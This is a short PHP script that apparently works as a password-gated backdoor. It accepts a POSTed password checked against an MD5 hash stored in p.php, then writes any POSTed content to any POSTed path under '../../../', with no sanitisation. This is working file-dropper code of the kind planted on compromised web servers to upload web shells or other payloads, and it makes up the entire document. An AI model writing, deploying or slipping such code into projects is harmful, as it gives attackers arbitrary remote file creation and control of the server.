<?php /*14.06.2017
0 - address file 
5 - content 
*/
if(!file_exists('./p.php')){exit('H7 protection');}else{
if('<? /*'.md5($_POST['p']).'*/ ?>'!=file_get_contents('./p.php')){exit('H7 pass no');}}

$_POST['address2']='./../../../' . $_POST['address'];

if (file_exists($_POST['address2']) ) { 
  echo 'X file exists '.$_POST['address']; 
}else{

  if( !isset($_POST['text']) || $_POST['text']=='' ) {
    $_POST['text']=' ';
  }

  $fp = fopen($_POST['address2'], "w");
  fwrite($fp, $_POST['text']);
  fclose($fp);

  if( file_exists($_POST['address2']) ){
    echo 'V';			
  }else{
    echo 'X';
  }
  echo ' new file '.$_POST['address'];
}

?>